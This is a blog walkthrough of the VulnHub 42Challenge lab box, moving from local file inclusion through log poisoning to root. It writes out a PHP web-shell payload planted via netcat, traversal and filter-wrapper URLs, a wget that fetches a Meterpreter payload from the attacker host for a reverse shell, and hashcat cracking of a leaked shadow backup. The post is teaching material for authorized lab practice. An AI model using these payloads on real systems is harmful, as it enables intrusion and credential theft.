---
layout: post
title: "Walkthrough: VulnHub 42Challenge, LFI to Root"
categories: ['blog']
tags: ['cyber', 'pentest', 'lfi', 'vulnhub', 'tutorial']
summary: "A boot-to-root walkthrough of VulnHub's 42Challenge that chains a client-side filter bypass, local file inclusion, log poisoning, a stray shadow backup and a reverse-engineered binary into a path to root. Flags and credentials are redacted; the focus is the methodology."
---

A condensed walkthrough of the [42Challenge](https://www.vulnhub.com/entry/42challenge-1,465/) boot-to-root box from VulnHub.
This one does not turn on a single CVE.
It chains several small weaknesses together: a client-side filter, a local file include, log poisoning, a backup file, and a little reverse engineering.
In my experience the methodology generalizes well beyond this box.

> Flag values and recovered credentials are intentionally redacted.
> This is a methodology guide and leaves out the spoilers.
> `TARGET` is the victim, `KALI` is the attacker box.

## 1. Recon: a suspicious "ping" form

The web app serves a single page: *"Please, type a target IP to make a ping."*
A form that shells out to `ping` is a classic command-injection and file-handling smell, so the first move is to read the page source before poking at the input.

Viewing source showed how it worked.
A trimmed version of `index.php`:

```php
<?php
if (isset($_POST['submit'])) {
    $tarjet = $_POST['ip'];
    // server-side blacklist of shell metacharacters
    $tarjet = str_replace(array("<?", "?>", ";", "&", "|", "(", ")", "'", "\""), "", $tarjet);
    system("ping " . $tarjet . " -c3 > logs/" . $ip . ".log");
    header("Location: index.php?log=logs/" . $ip . ".log");
}
?>
<script>
  // CLIENT-SIDE check — only allows ?log=logs/*.log
  const file = new URLSearchParams(window.location.search).get('log');
  if (file && !(file.includes('logs/') && file.includes('.log'))) {
      alert("Sorry, you are not allowed to read this file.");
      window.location.replace("index.php");
  }
</script>
<?php
  if (isset($_GET['log'])) { include($_GET['log']); }   // <-- the real bug: LFI
?>
```

Two things stand out:

- The "you can't read that file" block is enforced in JavaScript, on the client, so it provides no security.
- `include($_GET['log'])` is a textbook local file inclusion.

## 2. Initial access: bypass the client-side filter → LFI

Since the restriction is client-side, disable JavaScript in the browser.
The directory-traversal payload then goes through:

```
http://TARGET/index.php?log=../../../../etc/passwd
```

`/etc/passwd` and `/etc/group` render right in the page, confirming the LFI and listing real users.

I also pulled application source with the PHP filter wrapper (base64 so it isn't executed):

```
http://TARGET/index.php?log=php://filter/convert.base64-encode/resource=index.php
```

## 3. LFI → RCE via log poisoning

`data://` and `php://` input wrappers were disabled (`allow_url_include=0`), so straight LFI-to-RCE was out.
The way through is log poisoning: the LFI can read the nginx logs, and the server writes attacker-controlled strings *into* those logs.

Step 1: plant a general-purpose web shell by sending a bogus request whose path is PHP.
The request string lands in `access.log`:

```bash
nc TARGET 80
GET /<?php system($_GET["cmd"]);?>
```

Step 2: include the poisoned log and pass a command.
When the LFI renders the log, the planted PHP executes:

```
http://TARGET/index.php?log=../../../../var/log/nginx/access.log&cmd=id
```

Swap `cmd=id` for `cmd=ls`, `cmd=cat%20flag.txt`, and so on.
That recovers the first foothold flag (`42challenge{www-data_…}`) as the `www-data` user.

## 4. Upgrade to a reverse shell

Driving the box one URL at a time is tedious.
I staged a Meterpreter PHP payload on `KALI`, pulled it over with the `cmd=` web shell, and caught it with Metasploit:

```bash
# on KALI: stage payload.php (php/meterpreter/reverse_tcp) on a webserver, then:
# via the poisoned-log cmd= shell on TARGET:
#   cmd=wget%20http://KALI/payload.zip
#   cmd=unzip%20payload.zip

# on KALI: catch it
msf6 > use multi/handler
msf6 > set PAYLOAD php/meterpreter/reverse_tcp
msf6 > set LHOST KALI
msf6 > set LPORT 4444
msf6 > exploit
```

Browsing to `http://TARGET/payload.php` fires the callback and opens an interactive `www-data` shell.

## 5. Privilege escalation by forensics, not exploits

The box is a well-patched Ubuntu 18.04, and kernel and service exploits went nowhere.
So I switched from a "find a CVE" approach to a forensic one: hunt for files whose permissions and timestamps are out of place.

```bash
# what can my UID actually read/write?
find / 2>&1 | grep -v "Permission denied" | grep -v share | grep flag
find / -readable 2>&1 | grep -v "Permission denied" | grep flag
find / -writable 2>&1 | grep -v "Permission denied" | grep -v proc | grep -v snap
```

The flags all shared a timestamp (the box's "incident" date), so I pivoted to listing everything created around that date.
That surfaced the useful file:

```bash
find / -type f -ls 2>&1 | grep "Feb 2[09]" | grep -v denied
# -> /var/backups/shadow_backup.bak
```

A world-readable backup of `/etc/shadow`.
Copy the hashes to `KALI` and crack them with hashcat and rockyou:

```bash
hashcat -m 1800 -a 0 -o cracked --remove hashes.txt rockyou.txt
```

One cracked (`marvin:<redacted>`), so SSH in for a real TTY and the user flag.

## 6. Lateral movement: reverse-engineering a custom binary

`marvin` isn't a sudoer.
More forensic scanning turned up an out-of-place setuid-style binary:

```
/usr/bin/Lucas_Access
```

`strings` showed a password prompt ("Welcome to the Lucas access system") but no plaintext password, since it is assembled at runtime.
That calls for [radare2](https://rada.re/):

```bash
r2 ./Lucas_Access
[0x...]> ood          # reopen in debug mode
[0x...]> db main      # breakpoint
[0x...]> dc           # run to it
[0x...]> v            # visual mode; step through the compare
# watch the register where the password is assembled:
[0x...]> px @ rax
```

Single-stepping through the comparison reveals the password being built in memory.
Feed it back to the program to become `lucas` and read the `lucas` flag.

## 7. Toward root

Two more moves rounded it out:

- Hex-editing the UID in `Lucas_Access`, to try to assume a higher-privileged account, was a dead end. You cannot escalate beyond the binary owner's privileges that way, and it is worth understanding why it fails.
- Back to forensics as `lucas`, scanning for files writable by me and owned by root turned up a world-writable Python script owned by root, the kind of thing a root cron or service executes. That is the path to root: own the script, and let root run it.

```bash
find / -writable -user root 2>&1 | grep -v "Permission denied" | grep -v proc
```

## Takeaways

- Client-side validation does not provide security. The entire entry point hinged on a check that lived in the browser.
- Chaining weaknesses matters. No single bug here was critical on its own, but LFI plus writable logs gave remote code execution.
- When exploits dry up, I find it pays to think like a forensic analyst. Timestamps and permission anomalies cracked both privilege-escalation steps. Patches stop known CVEs, and they do not stop a stray `shadow_backup.bak`.
- Being able to read a binary helps. A few minutes in radare2 saved me hours of guessing.

*Practice on intentionally vulnerable targets you own or are authorized to test.*
*Never touch systems you do not have explicit permission to attack.*
